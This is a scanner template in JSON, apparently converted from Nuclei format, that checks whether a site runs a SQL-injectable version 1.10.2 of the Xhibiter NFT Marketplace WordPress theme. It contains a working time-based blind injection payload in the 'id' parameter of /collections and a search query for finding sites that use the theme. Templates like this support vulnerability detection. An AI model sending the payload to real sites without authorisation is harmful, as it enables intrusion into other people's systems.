@@ -1,0 +1,192 @@
+{
+  "id": "xhibiter-nft-sqli",
+  "name": "Xhibiter NFT Marketplace 1.10.2 - SQL Injection",
+  "author": "ProjectDiscoveryAI",
+  "severity": "HIGH",
+  "description": "The Xhibiter NFT Marketplace version 1.10.2 is vulnerable to a SQL Injection vulnerability. This allows an attacker to manipulate SQL queries by injecting malicious SQL code through vulnerable input fields.\n",
+  "references": [
+    "https://www.exploit-db.com/exploits/52060",
+    "https://blog.securelayer7.net/sql-injection-vulnerability-in-xhibiter-nft-marketplace/",
+    "https://x.com/ExploitDB/status/1807782485549560196"
+  ],
+  "tags": [
+    "xhibiter",
+    "sqli",
+    "time-based-sqli",
+    "wordpress",
+    "wp-theme",
+    "xhibiter",
+    "nft"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "http(1) \u0026\u0026 http(2)",
+  "searchQueries": {
+    "publicwww": "/wp-content/themes/xhibiter/"
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET / HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "/wp-content/themes/xhibiter/"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /collections?id\u003d2\u0027+AND+(SELECT+1492+FROM+(SELECT(SLEEP(7)))HsLV)+AND+\u0027KEOa\u0027\u003d\u0027KEOa HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "duration\u003e\u003d7"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "xhibiter-nft-sqli",
+    "info": {
+      "name": "Xhibiter NFT Marketplace 1.10.2 - SQL Injection",
+      "author": "ProjectDiscoveryAI",
+      "severity": "high",
+      "description": "The Xhibiter NFT Marketplace version 1.10.2 is vulnerable to a SQL Injection vulnerability. This allows an attacker to manipulate SQL queries by injecting malicious SQL code through vulnerable input fields.\n",
+      "reference": [
+        "https://www.exploit-db.com/exploits/52060",
+        "https://blog.securelayer7.net/sql-injection-vulnerability-in-xhibiter-nft-marketplace/",
+        "https://x.com/ExploitDB/status/1807782485549560196"
+      ],
+      "metadata": {
+        "max_request": 2,
+        "publicwww_query": "/wp-content/themes/xhibiter/"
+      },
+      "tags": "xhibiter,sqli,time-based-sqli,wordpress,wp-theme,xhibiter,nft"
+    },
+    "flow": "http(1) \u0026\u0026 http(2)",
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET / HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "/wp-content/themes/xhibiter/"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /collections?id\u003d2\u0027+AND+(SELECT+1492+FROM+(SELECT(SLEEP(7)))HsLV)+AND+\u0027KEOa\u0027\u003d\u0027KEOa HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "duration\u003e\u003d7"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
